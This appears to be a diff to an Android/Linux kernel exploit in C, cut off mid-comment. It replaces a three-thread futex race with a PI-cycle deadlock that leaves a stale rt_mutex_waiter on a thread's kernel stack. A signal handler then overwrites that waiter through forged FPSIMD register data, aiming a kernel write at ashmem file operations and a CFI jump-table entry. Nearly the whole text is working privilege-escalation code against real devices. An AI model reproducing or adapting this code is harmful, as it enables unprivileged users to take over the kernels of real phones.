@@ -18,6 +18,116 @@
 #include <arpa/inet.h>
 #include <sched.h>
 #include <time.h>
+#include <sys/ioctl.h>
+#include <linux/ashmem.h>
+#include <ucontext.h>
+#include <stdatomic.h>
+#include <sys/types.h>
+
+#ifndef FPSIMD_MAGIC
+#define FPSIMD_MAGIC 0x46508001ULL
+#endif
+
+struct k_fpsimd_context {
+    uint32_t magic;
+    uint32_t size;
+    uint32_t fpsr;
+    uint32_t fpcr;
+    uint8_t  vregs[32 * 16];
+};
+
+#ifndef SIGRETURN_FPSIMD_WAITER_OFF
+#define SIGRETURN_FPSIMD_WAITER_OFF 0x148
+#endif
+
+static atomic_int sigret_respray_flag = 0;
+static atomic_int sigret_handler_done = 0;
+static atomic_int sigret_handler_status = 0;
+static _Atomic uint64_t sigret_respray_pc = 0;
+static _Atomic uint64_t sigret_respray_val = 0;
+static _Atomic uint64_t sigret_respray_lock = 0;
+static void *g_waiter_task_at_trigger = NULL;
+
+#define LOG(fmt, ...) \
+    do { \
+        printf("[race] " fmt "\n", ##__VA_ARGS__); \
+        fflush(stdout); \
+    } while (0)
+
+static long get_sigreturn_offset(void) {
+    const char *env = getenv("SIGRETURN_WAITER_OFF");
+    if (env) return strtol(env, NULL, 0);
+    return SIGRETURN_FPSIMD_WAITER_OFF;
+}
+
+static void sigreturn_handler(int sig, siginfo_t *info, void *ucontext) {
+    (void)sig; (void)info;
+    ucontext_t *uc = (ucontext_t *)ucontext;
+    unsigned char *start = uc->uc_mcontext.__reserved;
+    unsigned char *end = start + sizeof(uc->uc_mcontext.__reserved);
+    unsigned char *cur = start;
+    int status = -3;
+
+    while ((size_t)(end - cur) >= 8) {
+        uint32_t m = *(const uint32_t *)cur;
+        uint32_t sz = *(const uint32_t *)(cur + 4);
+        if (m == 0 && sz == 0) break;
+        if (sz < 8 || (sz & 15) || (size_t)(end - cur) < (size_t)sz) break;
+        if (m == (uint32_t)FPSIMD_MAGIC) {
+            struct k_fpsimd_context *fpsimd = (struct k_fpsimd_context *)cur;
+            long off = get_sigreturn_offset();
+            if ((size_t)off + RT_MUTEX_WAITER_SIZE > sizeof(*fpsimd)) {
+                status = -5;
+                break;
+            }
+            unsigned char *dst = (unsigned char *)fpsimd + off;
+            uint64_t *w = (uint64_t *)dst;
+
+            LOG("SIG-ENTRY fpsimd=%p off=%#lx", fpsimd, off);
+
+            if (atomic_load(&sigret_respray_flag)) {
+                w[0x00/8] = atomic_load(&sigret_respray_pc);
+                w[0x08/8] = atomic_load(&sigret_respray_val);
+                w[0x10/8] = 0;
+                w[0x18/8] = 0;
+                w[0x20/8] = 0;
+                w[0x28/8] = 0;
+                w[0x30/8] = (uint64_t)ADDR_INIT_TASK;              // valid task_struct → PI-walk terminates
+                w[0x38/8] = (uint64_t)(ADDR_ASHMEM_FOPS + 0x28 - 8); // write_target - 8
+                for (size_t i = 0x40/8; i < RT_MUTEX_WAITER_SIZE/8; i++) w[i] = 0;
+                atomic_store(&sigret_respray_flag, 0);
+            } else {
+                memset(w, 0, RT_MUTEX_WAITER_SIZE);
+                w[0x00/8] = (uint64_t)(ADDR_ASHMEM_FOPS + 0x20);
+                w[0x08/8] = 0;
+                w[0x10/8] = (uint64_t)ADDR_CONFIGFS_WRITE_BIN_FILE_CFI_JT;
+                w[0x30/8] = (uint64_t)ADDR_INIT_TASK;                     // valid task_struct → terminates PI-walk
+                w[0x38/8] = (uint64_t)(ADDR_ASHMEM_FOPS + 0x28 - 8);      // write_target - 8 → rb_parent_color lands at target
+            }
+
+            LOG("GHOST-TASK ptr=%p", (void*)ADDR_GHOST_TASK);
+
+            LOG("SIG-WRITTEN %016lx %016lx %016lx %016lx %016lx %016lx "
+                "%016lx %016lx %016lx %016lx",
+                w[0],w[1],w[2],w[3],w[4],w[5],w[6],w[7],w[8],w[9]);
+
+            status = 1;
+            break;
+        }
+        cur += sz;
+    }
+    atomic_store(&sigret_handler_status, status);
+    atomic_store(&sigret_handler_done, 1);
+}
+
+static void sigreturn_install_handler(void) {
+    struct sigaction sa;
+    memset(&sa, 0, sizeof(sa));
+    sa.sa_sigaction = sigreturn_handler;
+    sa.sa_flags = SA_SIGINFO | SA_RESTART;
+    sigemptyset(&sa.sa_mask);
+    sigaction(SIGUSR2, &sa, NULL);
+}
 
 /* ── EXP32_STAMP_OFF runtime override for calibration ── */
 static size_t get_stamp_offset(void)
@@ -35,58 +145,32 @@ static size_t get_stamp_offset(void)
     return 0x58;
 }
 
-#define WAITER_WAIT_SEC 5
+#ifndef FUTEX_PRIVATE_FLAG
+#define FUTEX_PRIVATE_FLAG 128
+#endif
+#define FUTEX_WAIT_REQUEUE_PI_PRIVATE (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
+#define FUTEX_CMP_REQUEUE_PI_PRIVATE  (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
+#define FUTEX_LOCK_PI_PRIVATE         (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
+#define FUTEX_UNLOCK_PI_PRIVATE       (FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG)
 
-/* 3 futex variables for proper deadlock setup */
-static uint32_t f_wait;
-static uint32_t f_pi_target;
-static uint32_t f_pi_chain;
+/* ── PI-cycle deadlock topology: Thread X and Thread Y ── */
+static _Atomic int pi1  = 0;
+static _Atomic int pi2  = 0;
+static _Atomic int cond = 0;
 
-struct race_ctx {
-    int sockfd;
-    volatile int waiter_ready;
-    volatile int waiter_waiting;
-    volatile int owner_started;
-    volatile int a_sprayed;
-    volatile int walk_done;
-    volatile pid_t tid_a;
-    volatile int cmp_requeued;
-    volatile int edealdk_confirmed;
-    volatile int waiter_return_errno;
-    volatile int waiter_timed_out;
-    volatile int waiter_unlocked_before_stamp;
-    volatile int stamp_entered;
-    volatile int stamp_completed;
-    volatile int release_requested;
-    volatile int release_signal_errno;
-    uint64_t t_begin_ms;
-    uint64_t t_wait_enter_ms;
-    uint64_t t_cmp_call_ms;
-    uint64_t t_cmp_return_ms;
-    uint64_t t_release_ms;
-    uint64_t t_wait_return_ms;
-    uint64_t t_unlock_ms;
-    uint64_t t_stamp_enter_ms;
-    uint64_t t_stamp_done_ms;
-    uint64_t t_consumer_walk_ms;
-    uint64_t t_walk_done_ms;
-};
+static atomic_int x_locked_l1 = 0;
+static atomic_int y_locked_l2 = 0;
+static atomic_int x_blocking  = 0;
+static atomic_int y_parking   = 0;
+static atomic_int y_done      = 0;
+static atomic_int y_tid       = 0;
+static atomic_int x_done      = 0;
+static atomic_int y_cleanup   = 0;
 
-static struct race_ctx g_ctx;
-static pthread_t g_thread_waiter;
-static pthread_t g_thread_owner;
-static pthread_t g_thread_consumer;
-
-static void sigusr1_handler(int sig)
-{
-    (void)sig;
+/* FUTEX_WAKE helper (private) */
+static inline long futex_wake_one(volatile int *addr) {
+    return syscall(SYS_futex, addr, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1, NULL, NULL, 0);
 }
-
-#define LOG(fmt, ...) \
-    do { \
-        printf("[race] " fmt "\n", ##__VA_ARGS__); \
-        fflush(stdout); \
-    } while (0)
 
 static uint64_t now_ms(void)
 {
@@ -97,446 +181,302 @@ static uint64_t now_ms(void)
     return (uint64_t)ts.tv_sec * 1000ULL + (uint64_t)ts.tv_nsec / 1000000ULL;
 }
 
-static uint64_t rel_ms(const struct race_ctx *ctx, uint64_t t)
-{
-    if (!ctx || !ctx->t_begin_ms || !t || t < ctx->t_begin_ms) {
-        return 0;
-    }
-    return t - ctx->t_begin_ms;
-}
+/* Thread Y: owns pi2, parks on cond->pi1, then stamps ghost */
+void *thread_Y(void *arg __attribute__((unused))) {
+    atomic_store(&y_tid, (int)syscall(SYS_gettid));
 
-static void log_syscall(const char *name, long ret, int saved_errno)
-{
-    if (ret < 0) {
-        LOG("%s -> ret=%ld errno=%d (%s)",
-            name, ret, saved_errno, strerror(saved_errno));
-    } else {
-        LOG("%s -> ret=%ld", name, ret);
-    }
-}
+    /* 1. Install SIGUSR2 sigreturn handler BEFORE we park.
+     *    Must be active at the moment we return from FUTEX_WAIT_REQUEUE_PI so
+     *    we can immediately self-signal for the stamp without any intervening
+     *    syscall that would push a new kernel frame and clobber the stale waiter. */
+    sigreturn_install_handler();
 
-/*
- * Thread A (waiter): Create the stale waiter on its kernel stack
- * 1. Lock f_pi_chain (become PI owner)
- * 2. Wait on f_wait with requeue to f_pi_target
- * 3. Build spray buffer on stack
- * 4. Call recvmmsg() which blocks forever
- */
-static void *waiter_thread(void *arg)
-{
-    struct race_ctx *ctx = (struct race_ctx *)arg;
+    /* 2. Acquire PI lock 2 (L2) */
+    long r = futex_raw(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
+    if (r != 0) { LOG("thread_Y: LOCK_PI(pi2) failed errno=%d", errno); return NULL; }
+    atomic_store(&y_locked_l2, 1);
 
-    ctx->tid_a = (pid_t)syscall(SYS_gettid);
-    LOG("waiter_thread TID=%d", ctx->tid_a);
+    /* 3. Wait for thread_X to own pi1 and block on pi2 */
+    while (!atomic_load(&x_locked_l1)) sched_yield();
 
-    /* Step 1: Lock pi_chain (become PI owner) */
-    errno = 0;
-    long r0 = syscall(SYS_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
-    log_syscall("WAITER: LOCK_PI(pi_chain)", r0, errno);
-    if (r0 != 0) {
-        LOG("WAITER: Failed to lock pi_chain");
-        return NULL;
-    }
+    /* 4. Park on cond -> pi1 with NO TIMEOUT.
+     *
+     *    Main thread calls CMP_REQUEUE_PI(cond, 1, pi1):
+     *      - Kernel detects Y->pi1->pi2->Y deadlock cycle -> EDEADLK
+     *      - DURING that walk, requeue_waiter() moves Y's rt_mutex_waiter from
+     *        cond's hash-bucket into pi1's waiter rb-tree
+     *      - When CMP_REQUEUE_PI returns EDEADLK to main, Y's waiter is IN pi1
+     *
+     *    Main then sets cond=1 + calls FUTEX_WAKE on cond.
+     *    We wake via the normal futex wakeup path (NOT SIGUSR1/EINTR).
+     *    EINTR would call remove_waiter() -> stale pointer gone -> exploit fails.
+     *    FUTEX_WAKE preserves the stale pi1 waiter pointer intact. */
+    atomic_store(&y_parking, 1);
+    r = futex_raw(&cond, FUTEX_WAIT_REQUEUE_PI_PRIVATE, 0, 0, &pi1, 0);
+    LOG("thread_Y: FUTEX_WAIT_REQUEUE_PI returned r=%ld errno=%d", r, errno);
 
-    ctx->waiter_ready = 1;
-    LOG("WAITER: waiter_ready=1");
-
-    /* Wait for owner to start */
-    while (!ctx->owner_started) {
-        usleep(1000);
-    }
-    LOG("WAITER: owner_started=1");
-
-    /* FUTEX_WAIT_REQUEUE_PI takes an absolute monotonic deadline. */
-    struct timespec ts;
-    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
-        LOG("WAITER: clock_gettime(CLOCK_MONOTONIC) failed errno=%d", errno);
-        errno = 0;
-        syscall(SYS_futex, &f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
-        return NULL;
-    }
-    ts.tv_sec += WAITER_WAIT_SEC;
-
-    ctx->waiter_waiting = 1;
-    ctx->t_wait_enter_ms = now_ms();
-    LOG("WAITER: FUTEX_WAIT_REQUEUE_PI(f_wait -> f_pi_target)");
-
-    errno = 0;
-    long r = syscall(SYS_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
-                     &ts, &f_pi_target, 0);
-    ctx->t_wait_return_ms = now_ms();
-    int wait_errno = (r < 0) ? errno : 0;
-    ctx->waiter_return_errno = wait_errno;
-    log_syscall("WAITER: FUTEX_WAIT_REQUEUE_PI", r, wait_errno);
-
-    /* If we get here via timeout, unlock pi_chain */
-    if (wait_errno == ETIMEDOUT) {
-        ctx->waiter_timed_out = 1;
-        LOG("WAITER: timeout detected, unlocking pi_chain");
-        errno = 0;
-        ctx->waiter_unlocked_before_stamp = 1;
-        long r2 = syscall(SYS_futex, &f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
-        ctx->t_unlock_ms = now_ms();
-        log_syscall("WAITER: UNLOCK_PI(pi_chain)", r2, errno);
-    } else {
-        LOG("WAITER: non-timeout return, preserving pi_chain for stamp diagnostics");
+    /* 5. Initial stamp via SIGUSR2 -> sigreturn handler.
+     *    Handler writes ghost fields into FPSIMD vregs in the userspace ucontext.
+     *    rt_sigreturn copies 528B onto kernel stack -> overwrites stale waiter.
+     *    Stack geometry (verified): buffer_start = SP_sys-0x330, waiter at +0x148. */
+    atomic_store(&sigret_respray_flag, 0);
+    atomic_store(&sigret_handler_done, 0);
+    atomic_store(&sigret_handler_status, 0);
+    {
+        int tid = (int)syscall(SYS_gettid);
+        syscall(SYS_tgkill, getpid(), tid, SIGUSR2);
+        while (!atomic_load(&sigret_handler_done)) sched_yield();
+        LOG("thread_Y: initial SIGRETURN stamp status=%d",
+            atomic_load(&sigret_handler_status));
     }
 
-    /* Step 4: Stamp kernel stack */
-#ifdef USE_MCAST_STAMP
-    /* Native 64-bit IPv4 MCAST stamp */
-    unsigned char gsr[MCAST_BUFFER_SIZE_64];
-    memset(gsr, 0, sizeof(gsr));
+    atomic_store(&y_done, 1);
 
-    /* Setup valid group and source sockaddr_in structures so setsockopt proceeds to copy */
-    struct sockaddr_in *sin_grp = (struct sockaddr_in *)&gsr[8];
-    sin_grp->sin_family = AF_INET;
-    sin_grp->sin_addr.s_addr = inet_addr("239.255.0.1");
-
-    struct sockaddr_in *sin_src = (struct sockaddr_in *)&gsr[0x88];
-    sin_src->sin_family = AF_INET;
-    sin_src->sin_addr.s_addr = inet_addr("192.0.2.1");
-
-    /*
-     * Waiter base lands at gsr + MCAST_64_WAITER_BASE_OFF (0xc8)
-     * Waiter task (Word 6, +0x30) lands at gsr + MCAST_64_TASK_OFF (0xf8)
-     * Waiter lock (Word 7, +0x38) lands at gsr + MCAST_64_LOCK_OFF (0x100)
-     */
-    uint64_t v_task = ADDR_INIT_TASK;
-#ifdef X216B_TASK_PROBE
-    v_task = 0xdeadbeefcafebabeULL;
-    LOG("STACK_PROBE: waiter->task marker=0x%016llx", (unsigned long long)v_task);
-#endif
-
-    uint64_t v_lock = ADDR_VERIFIED_VLOCK;
-#ifdef X216B_LOCK_PROBE
-    v_lock = 0xdeadbeefcafebabeULL;
-    LOG("STACK_PROBE: waiter->lock marker=0x%016llx", (unsigned long long)v_lock);
-#endif
-
-    memcpy(&gsr[MCAST_64_TASK_OFF], &v_task, sizeof(uint64_t));
-    memcpy(&gsr[MCAST_64_LOCK_OFF], &v_lock, sizeof(uint64_t));
-
-    ctx->a_sprayed = 1;
-    ctx->stamp_entered = 1;
-    ctx->t_stamp_enter_ms = now_ms();
-    LOG("WAITER: entering IPv4 MCAST_BLOCK_SOURCE stamp (task=0x%llx lock=0x%llx)",
-        (unsigned long long)v_task, (unsigned long long)v_lock);
-    errno = 0;
-    (void)setsockopt(ctx->sockfd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
-                     gsr, (socklen_t)sizeof(gsr));
-    /* Do not log or issue a syscall on this thread before the consumer */
-    ctx->stamp_completed = 1;
-    ctx->t_stamp_done_ms = now_ms();
-    ctx->a_sprayed = 2;
-    LOG("WAITER: stamp completed");
-    while (!ctx->walk_done) {
-        __asm__ __volatile__("yield" ::: "memory");
-    }
-    return NULL;
-#else
-    /* do_recvmmsg fallback path */
-    char buf[56];
-    memset(buf, 0, sizeof(buf));
-
-    uint64_t v_task_fb = ADDR_INIT_TASK;
-    uint64_t v_lock_fb = ADDR_VERIFIED_VLOCK;
-    uint32_t v_prio = 120;
-
-    memcpy(buf + 0x20, &v_task_fb, 8);
-    memcpy(buf + 0x28, &v_lock_fb, 8);
-    memcpy(buf + 0x30, &v_prio, 4);
-
-    struct { uint8_t hdr[56]; uint32_t len; } __attribute__((packed)) mmsg;
-    memcpy(mmsg.hdr, buf, 56);
-    mmsg.len = 0;
-
-    ctx->a_sprayed = 1;
-    ctx->stamp_entered = 1;
-    ctx->t_stamp_enter_ms = now_ms();
-    LOG("WAITER: a_sprayed=1, entering recvmmsg()");
-
-    /* Call recvmmsg - blocks forever, holding the stack */
-    syscall(SYS_recvmmsg, ctx->sockfd, &mmsg, 1, 0, NULL);
-    ctx->stamp_completed = 1;
-    ctx->t_stamp_done_ms = now_ms();
-
-    while (!ctx->walk_done) {
-        __asm__ __volatile__("yield" ::: "memory");
+    /* 6. Respray loop: stays resident on this stack so the stale PI-chain pointer
+     *    (which points here) remains valid while ghost_write_value operates. */
+    int respray_count = 0;
+    for (;;) {
+        if (g_respray_ready) {
+            g_respray_ready = 0;
+            atomic_store(&sigret_respray_pc,   (uint64_t)g_respray_parent_color);
+            atomic_store(&sigret_respray_val,  (uint64_t)g_respray_value);
+            atomic_store(&sigret_respray_flag, 1);
+            atomic_store(&sigret_handler_done, 0);
+            {
+                int tid = (int)syscall(SYS_gettid);
+                syscall(SYS_tgkill, getpid(), tid, SIGUSR2);
+                while (!atomic_load(&sigret_handler_done)) sched_yield();
+            }
+            respray_count++;
+            LOG("RESPRAY-DONE: sigreturn status=%d pc=0x%lx val=0x%lx",
+                atomic_load(&sigret_handler_status),
+                g_respray_parent_color, g_respray_value);
+            LOG("thread_Y: respray #%d status=%d pc=0x%lx val=0x%lx",
+                respray_count, atomic_load(&sigret_handler_status),
+                g_respray_parent_color, g_respray_value);
+            __atomic_store_n(&g_respray_done, 1, __ATOMIC_RELEASE);
+        }
+        if (atomic_load(&y_cleanup)) break;
+        sched_yield();
     }
 
-    while (1) pause();
-    return NULL;
-#endif
-}
+    /* 7. DISARM: zero-timeout LOCK_PI on a self-owned futex forces the kernel PI
+     *    slowpath -> remove_waiter() sets task->pi_blocked_on = NULL, cleanly
+     *    unlinking the ghost from every PI walk. Without this, the stale pointer
+     *    stays live and causes deadlock/panic on process exit (confirmed on POCO). */
+    int dummy_pi = (int)(0x80000000U | (unsigned int)getpid());
+    struct timespec ts_zero = { .tv_sec = 0, .tv_nsec = 0 };
+    (void)futex_raw(&dummy_pi, FUTEX_LOCK_PI_PRIVATE, 0, (long)&ts_zero, NULL, 0);
+    LOG("thread_Y: disarmed pi_blocked_on");
 
-/*
- * Thread B (owner): Lock the chain to set up the deadlock
- */
-static void *owner_thread(void *arg)
-{
-    struct race_ctx *ctx = (struct race_ctx *)arg;
+    /* 8. Release L2 so thread_X can wake and exit cleanly */
+    futex_raw(&pi2, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
 
-    /* Lock pi_target first */
-    errno = 0;
-    long r0 = syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
-    log_syscall("OWNER: LOCK_PI(pi_target)", r0, errno);
-    if (r0 != 0) {
-        LOG("OWNER: Failed to lock pi_target");
-        return NULL;
-    }
+    /* 9. Wait for X to finish (stack must remain valid until X exits) */
+    while (!atomic_load(&x_done)) sched_yield();
 
-    LOG("OWNER: waiting for waiter_ready...");
-    while (!ctx->waiter_ready) {
-        usleep(1000);
-    }
-    LOG("OWNER: waiter_ready=1");
-
-    ctx->owner_started = 1;
-    LOG("OWNER: owner_started=1");
-
-    /* Try to lock pi_chain - blocks because waiter holds it */
-    LOG("OWNER: LOCK_PI(pi_chain) -- will block");
-    errno = 0;
-    long r = syscall(SYS_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
-    log_syscall("OWNER: LOCK_PI(pi_chain)", r, errno);
-
-    while (1) pause();
+    LOG("thread_Y: exiting after %d resprays", respray_count);
     return NULL;
 }
 
-/*
- * Thread C (consumer): Trigger the deadlock and walk
- *
- * The CMP_REQUEUE_PI MUST be called from the MAIN thread (or BEFORE
- * consumer starts its main work), because:
- * - CMP_REQUEUE_PI triggers the PI chain walk via rt_mutex_start_proxy_lock
- * - This cleans the wrong waiter's pi_blocked_on (main's, not waiter's)
- * - The waiter's pi_blocked_on stays dangling, pointing to its kernel stack
- * - When consumer later triggers sched_setattr, the pi_chain walk uses
- *   the dangling waiter, causing the use-after-free via rb_erase_cached
- *
- * The consumer thread's job is to trigger sched_setattr on the waiter
- * AFTER the exploit payload has been stamped on the stack.
- */
-static void *consumer_thread(void *arg)
-{
-    struct race_ctx *ctx = (struct race_ctx *)arg;
+/* Thread X: owns pi1, blocks on pi2 (held by Y) — creates the deadlock cycle */
+void *thread_X(void *arg __attribute__((unused))) {
+    while (!atomic_load(&y_locked_l2)) sched_yield();
 
-    while (!ctx->a_sprayed) {
-        usleep(1000);
-    }
+    /* Acquire pi1 (L1) */
+    long r = futex_raw(&pi1, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
+    if (r != 0) { LOG("thread_X: LOCK_PI(pi1) failed errno=%d", errno); return NULL; }
+    atomic_store(&x_locked_l1, 1);
 
-    /* Wait for CMP_REQUEUE_PI to have been called (by trigger_futex_race) */
-    usleep(500000);
+    /* Block on pi2 (L2, held by Y) — creates Y->pi1->pi2->Y deadlock cycle */
+    atomic_store(&x_blocking, 1);
+    r = futex_raw(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
+    LOG("thread_X: LOCK_PI(pi2) woke r=%ld errno=%d", r, errno);
 
-    /* Trigger consumer walk via sched_setattr */
-    LOG("CONSUMER: sched_setattr(tid_a=%d)", ctx->tid_a);
-    ctx->t_consumer_walk_ms = now_ms();
-
-    struct sched_attr {
-        uint32_t size;
-        uint32_t sched_policy;
-        uint64_t sched_flags;
-        int32_t  sched_nice;
-        uint32_t sched_priority;
-        uint64_t sched_runtime;
-        uint64_t sched_deadline;
-        uint64_t sched_period;
-    } attr;
-
-    memset(&attr, 0, sizeof(attr));
-    attr.size = sizeof(attr);
-    /*
-     * Use SCHED_BATCH (policy 3) with a positive nice value.
-     * SCHED_FIFO (policy 1) requires CAP_SYS_NICE and fails with EPERM (errno 1)
-     * when running as unprivileged UID 2000 (AID_SHELL).
-     * Changing nice on a thread within the same process is permitted without privileges.
-     */
-    attr.sched_policy = 3;  /* SCHED_BATCH */
-    attr.sched_nice = 5;
-
-    errno = 0;
-    long pr = syscall(SYS_sched_setattr, ctx->tid_a, &attr, 0);
-    log_syscall("CONSUMER: sched_setattr", pr, errno);
-
-    ctx->walk_done = 1;
-    ctx->t_walk_done_ms = now_ms();
-
-    while (1) pause();
+    /* Woke up (Y released L2 via disarm). Release both locks. */
+    futex_raw(&pi1, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
+    futex_raw(&pi2, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
+    atomic_store(&x_done, 1);
+    LOG("thread_X: released L1/L2, exiting");
     return NULL;
 }
 
 int trigger_futex_race(void)
 {
-    memset(&g_ctx, 0, sizeof(g_ctx));
-    g_ctx.t_begin_ms = now_ms();
+    LOG("=== trigger_futex_race (PI-cycle deadlock) BEGIN ===");
 
-    struct sigaction sa;
-    memset(&sa, 0, sizeof(sa));
-    sa.sa_handler = sigusr1_handler;
-    sigemptyset(&sa.sa_mask);
-    if (sigaction(SIGUSR1, &sa, NULL) != 0) {
-        LOG("sigaction(SIGUSR1) failed errno=%d", errno);
-        return -1;
+    g_k_fake_lock  = ADDR_FAKE_LOCK;
+    g_k_fake_lock2 = ADDR_FAKE_LOCK + 0x80;
+    g_k_ghost_task = ADDR_GHOST_TASK;
+    LOG("ghost_init: fake_lock=0x%lx fake_lock2=0x%lx ghost_task=0x%lx",
+        g_k_fake_lock, g_k_fake_lock2, g_k_ghost_task);
+
+    /* Reset all topology state */
+    pthread_t ty, tx;
+    atomic_store(&y_tid,      0);
+    atomic_store(&x_locked_l1, 0);
+    atomic_store(&y_locked_l2, 0);
+    atomic_store(&x_blocking,  0);
+    atomic_store(&y_parking,   0);
+    atomic_store(&y_done,      0);
+    atomic_store(&x_done,      0);
+    atomic_store(&y_cleanup,   0);
+    atomic_store(&cond, 0);
+    atomic_store(&pi1,  0);
+    atomic_store(&pi2,  0);
+
+    /* Start threads: Y first (acquires pi2), then X (acquires pi1, blocks on pi2) */
+    int rty = pthread_create(&ty, NULL, thread_Y, NULL);
+    LOG("pthread_create(Y) ret=%d", rty);
+    if (rty != 0) { LOG("pthread_create(Y) failed"); return -1; }
+
+    int rtx = pthread_create(&tx, NULL, thread_X, NULL);
+    LOG("pthread_create(X) ret=%d", rtx);
+    if (rtx != 0) { LOG("pthread_create(X) failed"); return -1; }
+
+    /* Wait for full deadlock topology: Y owns L2, X owns L1, X blocks on L2, Y parks on cond */
+    for (int i = 0; i < 200000; i++) {
+        if (atomic_load(&y_locked_l2) && atomic_load(&x_locked_l1) &&
+            atomic_load(&y_parking)   && atomic_load(&x_blocking)) break;
+        usleep(10);
     }
+    LOG("PHASE1: deadlock topology ready Y_locked=%d X_locked=%d Y_parking=%d X_blocking=%d",
+        atomic_load(&y_locked_l2), atomic_load(&x_locked_l1),
+        atomic_load(&y_parking), atomic_load(&x_blocking));
 
-    LOG("=== trigger_futex_race BEGIN ===");
-
-    /* Create socket for recvmmsg */
-    g_ctx.sockfd = socket(AF_INET, SOCK_DGRAM, 0);
-    if (g_ctx.sockfd < 0) {
-        LOG("socket failed errno=%d", errno);
-        return -1;
-    }
-
-    /* Bind to a local port */
-    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = 0 };
-    addr.sin_addr.s_addr = htonl(0x7f000001);
-    if (bind(g_ctx.sockfd, (const struct sockaddr *)&addr, sizeof(addr)) < 0) {
-        LOG("bind failed errno=%d", errno);
-        close(g_ctx.sockfd);
-        return -1;
-    }
-
-    /* Create waiter thread */
-    if (pthread_create(&g_thread_waiter, NULL, waiter_thread, &g_ctx) != 0) {
-        LOG("pthread_create(WAITER) failed");
-        return -1;
-    }
-
-    /* Create owner thread */
-    if (pthread_create(&g_thread_owner, NULL, owner_thread, &g_ctx) != 0) {
-        LOG("pthread_create(OWNER) failed");
-        return -1;
-    }
-
-    /* Create consumer thread */
-    if (pthread_create(&g_thread_consumer, NULL, consumer_thread, &g_ctx) != 0) {
-        LOG("pthread_create(CONSUMER) failed");
-        return -1;
-    }
-
-    /* Wait for waiter and owner to be ready */
-    for (int i = 0; i < 5000 && !g_ctx.waiter_ready; i++) usleep(1000);
-    for (int i = 0; i < 5000 && !g_ctx.owner_started; i++) usleep(1000);
-    LOG("PHASE1: setup waiter_ready=%d owner_started=%d",
-        g_ctx.waiter_ready, g_ctx.owner_started);
-    usleep(1000000);
-
-    /* Wait for waiter to be inside FUTEX_WAIT_REQUEUE_PI */
-    for (int i = 0; i < 5000 && !g_ctx.waiter_waiting; i++) usleep(1000);
-    LOG("PHASE1: waiter_waiting=%d", g_ctx.waiter_waiting);
-
-    /* Give the scheduler a moment to settle */
+    /* Allow scheduler to fully settle */
     usleep(200000);
 
-    /* Trigger the deadlock -- CMP_REQUEUE_PI with val=1
-       This must be called AFTER:
-       - waiter is in FUTEX_WAIT_REQUEUE_PI (waiting for requeue)
-       - owner has started (blocked on pi_chain)
-
-       The waiter's pi_blocked_on points to its kernel stack waiter struct.
-       CMP_REQUEUE_PI cleans main's pi_blocked_on, NOT waiter's.
-       This leaves waiter's pi_blocked_on dangling to its stack. */
+    /* Trigger CMP_REQUEUE_PI(cond, 1, pi1):
+     *   Kernel walks: cond waiter Y -> try lock pi1 (owned by X) -> try lock pi2
+     *   (owned by Y) -> CYCLE DETECTED -> -EDEADLK.
+     *   BUT: before returning EDEADLK, kernel called requeue_waiter() moving Y's
+     *   rt_mutex_waiter from cond's hash-bucket into pi1's waiter rb-tree.
+     *   Y's waiter is now a STALE POINTER — pi1 waiter tree references kernel stack. */
     LOG("=== TRIGGERING CMP_REQUEUE_PI ===");
-    g_ctx.t_cmp_call_ms = now_ms();
     errno = 0;
-    long rr = syscall(SYS_futex, &f_wait, FUTEX_CMP_REQUEUE_PI, 1,
-                      (void *)1, &f_pi_target, 0);
-    g_ctx.t_cmp_return_ms = now_ms();
-    int r_errno = errno;
-    log_syscall("CMP_REQUEUE_PI", rr, r_errno);
+    long r = futex_raw(&cond, FUTEX_CMP_REQUEUE_PI_PRIVATE, 1, 0, &pi1, 0);
+    LOG("CMP_REQUEUE_PI returned r=%ld errno=%d", r, errno);
 
-    if (r_errno == 35) {  /* EDEADLK - deadlock detected */
-        g_ctx.edealdk_confirmed = 1;
-        LOG("CMP_REQUEUE_PI: EDEADLK confirmed");
-        LOG("PHASE1: releasing waiter for stack stamp");
-        f_wait = 1;
-        __atomic_thread_fence(__ATOMIC_SEQ_CST);
-        g_ctx.release_requested = 1;
-        g_ctx.t_release_ms = now_ms();
-        errno = 0;
-        long sigret = syscall(SYS_tgkill, getpid(), g_ctx.tid_a, SIGUSR1);
-        g_ctx.release_signal_errno = (sigret < 0) ? errno : 0;
-        if (sigret < 0) {
-            log_syscall("PHASE1: tgkill(SIGUSR1)", sigret, g_ctx.release_signal_errno);
-        }
-    } else if (r_errno != 0) {
-        LOG("CMP_REQUEUE_PI error errno=%d", r_errno);
+    /* futex_raw() returns -errno directly (not via errno variable).
+     * -EDEADLK (-35) is expected: kernel detected the PI cycle and called
+     * requeue_waiter() to move Y's waiter from cond into pi1's waiter tree.
+     * The stale pointer is now live on Y's kernel stack. */
+    if (-r == EDEADLK) {
+        LOG("CMP_REQUEUE_PI: -EDEADLK confirmed (expected) — stale waiter in pi1 tree");
     } else {
-        LOG("CMP_REQUEUE_PI returned 0");
+        LOG("CMP_REQUEUE_PI: unexpected result r=%ld (want -EDEADLK=-35)", r);
     }
 
-    g_ctx.cmp_requeued = 1;
+    /* Wake Y via tgkill(SIGUSR1):
+     * After requeue_waiter(), Y's waiter is in pi1's tree, NOT on cond.
+     * FUTEX_WAKE on cond would not reach it. Must use SIGUSR1.
